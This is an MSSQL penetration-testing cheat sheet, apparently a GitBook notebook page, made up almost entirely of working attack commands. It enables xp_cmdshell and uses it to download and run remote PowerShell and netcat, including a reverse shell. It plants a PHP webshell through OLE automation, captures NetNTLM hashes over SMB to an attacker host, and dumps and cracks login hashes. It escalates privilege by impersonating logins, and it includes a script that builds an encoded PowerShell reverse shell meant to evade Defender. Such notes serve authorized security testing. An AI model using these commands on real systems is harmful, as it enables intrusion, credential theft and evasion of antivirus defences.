# 1435 - MSSQL

{% hint style="danger" %}
If MSSQL port is open, try to login and see if we can execute commands or we are database admin to impersonate and use Potatoes to privesc to Administrator
{% endhint %}

## Overview

{% content-ref url="../web-pentesting/sql-injection-sqli/mssql.md" %}
[mssql.md](../web-pentesting/sql-injection-sqli/mssql.md)
{% endcontent-ref %}

{% code overflow="wrap" fullWidth="true" %}
```sql
https://www.exploit-db.com/papers/12975
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver16

https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

cme mssql $IP -u $USER -p $PASS (--local-auth / --windows-auth) -L # list modules
... -M mssql_priv

mssqlclient.py ...
SQL> help
# Read files
select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)
```
{% endcode %}

## With credentials

{% code overflow="wrap" fullWidth="true" %}
```sql
mssqlclient.py $user@$IP -windows-auth   # use domain/user format // then it will ask for the pass
mssqlclient.py -p $PORT (-db volume) (-windows-auth) <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> # Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine

sqsh -S $IP:$PORT -U $USER -P $PASSWORD

# Look for user-generated tables
SELECT name FROM sysobjects WHERE xtype = 'U'
# Check privileges of our user
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```
{% endcode %}

## Permissions

{% code overflow="wrap" fullWidth="true" %}
```sql
# Permissions > see if we have permissions to execute certains commands
EXEC sp_helprotect 'xp_dirtree'
EXEC sp_helprotect 'xp_fileexist'
EXEC sp_helprotect 'xp_subdirs'
EXEC sp_helprotect 'OPENROWSET'
```
{% endcode %}

## RCE

{% code overflow="wrap" %}
```bash
# xp_cmdshell
SQL> enable_xp_cmdshell
SQL > RECONFIGURE
SQL> xp_cmdshell "whoami"
SQL> GO
# We have to escape quotes sometimes
xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://IP:PORT/FILE.EXT\")"
SQL> xp_cmdshell "certutil -urlcache -split -f http://$IP/nc.exe c:\users\public\nc.exe"
SQL> xp_cmdshell "c:\users\public\nc.exe 192.168.0.100 80 -e cmd"
```
{% endcode %}

## List directories / Read files

{% code overflow="wrap" fullWidth="true" %}
```sql
# List directories / read files (Try without quotes, single, double, \\ // and all posible combinations)
xp_dirtree
xp_dirtree \
xp_dirtree \Users
> xp_dirtree 'C:\Users\'

# Check if we have permission to use BULK option
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

SELECT * FROM OPENROWSET (BULK 'c:usersadministratordesktoptest.txt', SINGLE_CLOB) as correlation_name;
```
{% endcode %}

## Write files

```sql
# NOTE: we need to enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

## Steal NetNTLMv2 hash (xp\_dirtree)

{% code overflow="wrap" fullWidth="true" %}
```bash
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack
# Steal NetNTLM hash / Relay attack
# You should start a SMB server to capture the hash used in the authentication (impacket-smbserver or responder for example).

xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer

SQL> xp_dirtree \\$IP\$share\something
# We check if we can list files
SQL> xp_dirtree 'C:\Windows\system32\spool\drivers\'
# Another link xp_dirtree sql server attack exploit
https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
# We stand up SMB server:
sudo smbserver.py share myshare -smb2support
# Execute command 
SQL> xp_dirtree '\\$LOCAL_IP\myshare',1,1
```
{% endcode %}

## RCE/Read files executing scripts (Python and R)

{% code overflow="wrap" fullWidth="true" %}
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
# Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
# Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
{% endcode %}

## Manual SQL Server Queries

{% code overflow="wrap" %}
```bash
# Query Current User & determine if the user is a sysadmin
select suser_sname()
select system_user
# Change database
SQL> use customdb
select is_srvrolemember('sysadmin')
# Current Role
Select user
# Current DB
select db_name()
# List all tables
select table_name from information_schema.tables
# List all databases
select name from master..sysdatabases
# All Logins on Server
Select * from sys.server_principals where type_desc != 'SERVER_ROLE'
# All Database Users for a Database
Select * from sys.database_principals where type_desc != 'database_role';
# List All Sysadmins
SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1
# List All Database Roles
SELECT DB1.name AS DatabaseRoleName,
isnull (DB2.name, 'No members') AS DatabaseUserName
FROM sys.database_role_members AS DRM
RIGHT OUTER JOIN sys.database_principals AS DB1
ON DRM.role_principal_id = DB1.principal_id
LEFT OUTER JOIN sys.database_principals AS DB2
ON DRM.member_principal_id = DB2.principal_id
WHERE DB1.type = 'R'
ORDER BY DB1.name;
# Effective Permissions from the Server
select * from fn_my_permissions(null, 'server');
# Effective Permissions from the Database
SELECT * FROM fn_dp1my_permissions(NULL, 'DATABASE');
# Find SQL Server Logins Which can be Impersonated for the Current Database
select distinct b.name
from sys.server_permissions a
inner join sys.server_principals b
on a.grantor_principal_id = b.principal_id
where a.permission_name = 'impersonate'
# Exploiting Impersonation
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'adminuser'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
# Exploiting Nested Impersonation
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'stduser'
SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
SELECT SYSTEM_USER
# MSSQL Accounts and Hashes
MSSQL 2000:
SELECT name, password FROM master..sysxlogins
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)

MSSQL 2005
SELECT name, password_hash FROM master.sys.sql_logins
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
# Then crack passwords using Hashcat : hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force
```
{% endcode %}

## Get hashes

```sql
SELECT name, password_hash FROM sys.sql_logins
```

## Impersonate

### Execute as login

{% code overflow="wrap" fullWidth="true" %}
```bash
nmap -p 1433 -sV -sC $IP_RANGE
nxc mssql $IP_RANGE
nxc $IP -u $USER -p $PASS -d dc.domain.local
# In case we have creds, we connect to the MSSQL server
python3 mssqlclient.py -windows-auth dc.domain.local/user:pass@fully.qualified.domain.local
# Once connected, start the enumeration
enum_db 
use $DATABASE
select name from sys.tables;
enum_logins
enum_impersonate
# If we can impersonate sb, we will know who by the grantor column and with these steps
exec_as_login sa # in case sa is the grantor
# We impersonate it
EXECUTE AS LOGIN = 'new-user'               
# We confirm we changed our user
SQL (hrappdb-reader  guest@master)> select suser_sname()

enable_xp_cmdshell
xp_cmdshell whoami # we should be able to execute commands after this
# After this, we could try to escalate more if we find more logins or impersonate options
```
{% endcode %}

### execute as user

{% code overflow="wrap" fullWidth="false" %}
```bash
enum_impersonate
# If we see dbo we can impersonate depending on the property is_trustworthy_on of the table
use $table
exec_as_user dbo
enable_xp_cmdshell
xp_cmdshell whoami
```
{% endcode %}

## Coerce and relay

{% code overflow="wrap" fullWidth="true" %}
```bash
responder -I tun0
# Authenticate with any user, does not matter the privileges
python3 mssqlclient.py -windows-auth dc.domain.local/user:pass@fully.qualified.domain.local
# Execute dirtree
exec master.sys.xp_dirtree '\\192.168.56.1\demontlm',1,1
# We should see NetNTLMv2 hash on Responder
```
{% endcode %}

## Trusted Links

```bash
# Try to authenticate with all domain accounts and see if some can enumerate links
enum_links
# If so
use_link $SRV_NAME
enable_xp_cmdshell
xp_cmdshell whoami
```

## Encoded PS payload to bypass AV and get RCE

```python
# Python script to convert PS code that bypasses Defender to Base64
#!/usr/bin/env python
import base64
import sys

if len(sys.argv) < 3:
  print('usage : %s ip port' % sys.argv[0])
  sys.exit(0)

payload="""
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])

byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)
print("powershell -exec bypass -enc %s" % b64.decode())

# Then execute it on MSSQL instance
xp_cmdshell powershell -exec bypass -enc $BASE64
```

## sqlcmd (issue queries on Windows)

[https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16\&tabs=odbc%2Clinux\&pivots=cs1-bash\
https://www.sqlshack.com/working-sql-server-command-line-sqlcmd/\
https://therootcompany.com/blog/mssql-cheat-sheet/](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16\&tabs=odbc%2Clinux\&pivots=cs1-bashhttps://www.sqlshack.com/working-sql-server-command-line-sqlcmd/https://therootcompany.com/blog/mssql-cheat-sheet/)

## Default MS-SQL System Tables

master Database: Records all the system-level information for an instance of SQL Server.

[https://www.mssqltips.com/sqlservertutorial/9225/sql-server-master-database-location/](https://www.mssqltips.com/sqlservertutorial/9225/sql-server-master-database-location/)

[https://www.syscurve.com/blog/how-to-open-mdf-file.html](https://www.syscurve.com/blog/how-to-open-mdf-file.html)

We find the file is master.mdf

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\SQLServer2017Media> Get-Childitem -Path C:\ -Recurse -Include *master.mdf* -File -force -ErrorAction SilentlyContinue
```
{% endcode %}

## Privesc (Windows)

{% code overflow="wrap" %}
```powershell
https://juggernaut-sec.com/mssql/
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

# Queries
PS> sqlcmd -L
sqlcmd -?
sqlcmd -Q "select * from sys.databases"
sqlcmd -Q "select name,create_date from sys.databases" # see if there is some DB recent than others
sqlcmd -Q "Use $DATABASE; select $FIELD from $TABLE"
sqlcmd -y0 -h-1  # -y0 prevents info truncation // -h-1 removes the column headers

# Powershell Tooltik to attack SQL Server and find vulns/exploits
https://github.com/NetSPI/PowerUpSQL
# Upload PowerUpSQL.ps1 and then
PS> Invoke-SQLAudit -Verbose
```
{% endcode %}

## PowerUpSQL

[https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

## MDF hashes

If we search about tools to extract MDF info, we find there is one to extract MDF hashes:

[https://xpnsec.tumblr.com/post/145350063196/reading-mdf-hashes-with-powershell](https://xpnsec.tumblr.com/post/145350063196/reading-mdf-hashes-with-powershell)

This refers to a Github tool:

[https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)

Actually, we do not need Windows for this since we can run Powershell on Kali using **pwsh**

We may find some errors on the way:

\- Not importing .dll correctly → check the own repo for fixes/pull requests [https://github.com/xpn/Powershell-PostExploitation/pull/4/commits/2e22f13362bf908d50abe4ae4936577b6985ca1b](https://github.com/xpn/Powershell-PostExploitation/pull/4/commits/2e22f13362bf908d50abe4ae4936577b6985ca1b)

\- Seeing ... and truncated hashes → make terminal font small until hashes fit

```bash
pwsh
└─PS> Add-Type -AssemblyName ./OrcaMDF.Framework.dll

└─PS> Add-Type -AssemblyName ./OrcaMDF.RawCore.dll

└─PS> . ./Get-MDFHashes.ps1

└─PS> Get-MDFHashes -mdf ./master.mdf
Name                           Value
----                           -----
...

# To crack the hashes
hashcat -m 1731 hashes rockyou.txt --potfile-disable

# To check credentials
cme mssql 10.11.1.1 -u sa -p password13

# Get a shell
mssqlclient.py sa:password13@10.11.1.1
```

## GUI

{% embed url="https://github.com/dbeaver/dbeaver" %}

## Other tools

* [https://github.com/NetSPI/ESC](https://github.com/NetSPI/ESC)
* [https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
* [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs)
